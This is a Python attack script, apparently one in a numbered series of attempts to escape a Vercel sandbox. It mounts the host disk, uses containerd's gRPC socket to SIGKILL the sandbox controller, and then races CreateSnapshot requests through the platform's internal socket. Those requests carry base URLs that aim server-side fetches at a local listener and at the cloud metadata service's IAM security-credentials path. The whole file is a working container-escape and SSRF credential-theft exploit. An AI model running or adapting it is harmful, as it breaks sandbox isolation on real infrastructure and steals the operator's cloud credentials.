# -*- coding: utf-8 -*-
"""vda49: 原子化 kill+snap 竞速
vda48 教训: Tasks/Kill 成功但 sandboxctrl 死后 ~1.5s 平台回收沙箱 -> 窗口期必须 0 延迟连打
流程:
  P1 取容器 UUID (task dir + List)
  P2 起 listener(18080) -> Tasks/Kill(SIGKILL) -> 立即循环 CreateSnapshot(sandbox, base_url 变体) 每 50ms
  P3 全程日志双写 (/vercel/sandbox/v49.out + /mnt/vdax/root/v49.out), 哨兵 V49D_DONE
  P4 兜底: 若 kill 后窗口未命中, 输出已落盘可恢复读取
"""
import os, time, socket, ctypes, subprocess, threading, re, struct

OUT = '/vercel/sandbox/v49.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v49.out'


def log(s, flush_extra=True):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    if flush_extra:
        try:
            open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def curl_h2(sockpath, path, payload, t=4, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(payload)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:150]
        except Exception:
            pass
        return r.returncode, r.stdout, hdrtxt, r.stderr
    except Exception as e:
        return -1, b'', '', str(e).encode()


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    return bytes([(field_no << 3) | 2, len(b)]) + b


def puint(field_no, v):
    out = bytearray([(field_no << 3) | 0])
    while v >= 0x80:
        out.append((v & 0x7f) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)


def pbool(field_no, v):
    return bytes([(field_no << 3) | 0, 1 if v else 0])


LISTEN = []


def start_listener(port=18080, seconds=20):
    def run():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(32)
            s.settimeout(seconds)
            t_end = time.time() + seconds
            while time.time() < t_end:
                try:
                    c, addr = s.accept()
                    c.settimeout(3)
                    try:
                        data = c.recv(8192)
                        LISTEN.append((addr, data[:400]))
                    except Exception:
                        LISTEN.append((addr, b''))
                    c.close()
                except socket.timeout:
                    continue
            s.close()
        except Exception as e:
            LISTEN.append(('ERR', str(e).encode()))
    th = threading.Thread(target=run)
    th.daemon = True
    th.start()
    return th


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)
    try:
        open(EXTRA, 'w').close()
    except Exception:
        pass

    CS = '/mnt/vdax/run/cell/cell.sock'
    CD = '/mnt/vdax/run/containerd/containerd.sock'
    CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    # 容器 UUID
    cids = []
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    try:
        cids = sorted(os.listdir(base))
        log('task dirs: %s' % cids)
    except Exception as e:
        log('task dir ERR %s' % e)
    if not cids:
        rc, out, hdr, err = curl_h2(CD, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
        if out:
            for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
                cids.append(m.group().decode())
        log('list ids: %s (rc=%d hdr=%s)' % (cids, rc, hdr))

    # listener 先起
    start_listener(18080, 18)
    time.sleep(1)

    # kill (SIGKILL all) - 只杀第一个 sandboxctrl
    log('=== KILL %s ===' % cids)
    rc, out, hdr, err = curl_h2(CD, '/containerd.services.tasks.v1.Tasks/Kill',
                                grpc_env(pstr(1, cids[0]) + puint(3, 9) + pbool(4, True)), t=4)
    log('kill rc=%d hdr=%s out=%r err=%r' % (rc, hdr, out[:80], err[:80]))

    # 0 延迟连打 CreateSnapshot
    urls = ['s3://127.0.0.1:18080/b/k',
            's3://127.0.0.1:18080/test.bin',
            's3://169.254.169.254/latest/meta-data/b/k',
            's3://127.0.0.1:1/b/k',
            's3://172.31.0.2/b/k',
            's3://bucket.s3.amazonaws.com/key']
    t_start = time.time()
    hits = []
    n = 0
    while time.time() - t_start < 10:
        url = urls[n % len(urls)]
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc_unix(CS, CSP, body, t=3)
        dt = time.time() - t0
        short = bd[:160].replace('\n', ' ')
        log('snap#%d %-52s -> %s (%.3fs) | %s' % (n, url, st, dt, short), flush_extra=(n % 3 == 0))
        if 'in use' not in bd:
            hits.append((url, bd[:400]))
            log('*** DRIVE FREE / FETCH ENGAGED: %s -> %s' % (url, bd[:400]))
            # 命中后换更重要的目标: IMDS
            urls = ['s3://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    's3://169.254.169.254/latest/meta-data/',
                    's3://127.0.0.1:18080/hit%d.bin' % n,
                    's3://169.254.169.254/1.0/meta-data/']
        n += 1
        time.sleep(0.05)
        if len(hits) > 8:
            break

    time.sleep(2)
    log('listener hits: %s' % LISTEN)
    log('V49D_DONE')
    f.close()


if __name__ == '__main__':
    main()
